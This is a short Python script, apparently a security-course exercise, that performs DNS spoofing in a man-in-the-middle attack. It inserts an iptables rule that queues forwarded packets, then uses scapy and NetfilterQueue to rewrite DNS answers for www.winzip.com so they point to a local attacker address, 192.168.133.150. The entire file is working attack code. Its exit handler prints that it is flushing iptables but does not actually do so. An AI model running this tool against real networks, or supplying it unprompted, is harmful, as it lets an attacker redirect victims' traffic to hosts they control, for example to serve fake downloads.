#!/usr/bin/env python2.7
"""
script now runs this automatically with parser option -q
before:
sudo iptables -I FORWARD -j NFQUEUE --queue-num #
after:
sudo iptables --flush
"""


import optparse
import scapy.all as scapy
from netfilterqueue import NetfilterQueue
import subprocess


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-q", "--queue-num", dest="queue_num", help="Number to be assigned to the queue for packet capture")
    (options, arguments) = parser.parse_args()
    if not options.queue_num:
        parser.error("[-] Please enter a number for the queue to capture packets (0-65535)")
    return options

def set_iptables(options):
    #use when attempting a man in the middle attack
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(options)])

    """
    test usage, applies to host machine
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", str(options)])
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", str(options)])
    """

def flush_iptables():
    subprocess.call(["iptables", "--flush"])


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.winzip.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.133.150")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))
            #print(scapy_packet.show())
    packet.accept()


def set_queue(options):
    queue = NetfilterQueue()
    queue.bind(options, process_packet)
    queue.run()

try:
    options = get_arguments()
    print("Setting up queue with NFQUEUE")
    set_iptables(options.queue_num)
    print("Queue set as " + str(options.queue_num))
    set_queue(int(options.queue_num))
    flush_iptables()
except KeyboardInterrupt:
    print("[-] Ctrl + C detected, flushing iptables and exiting")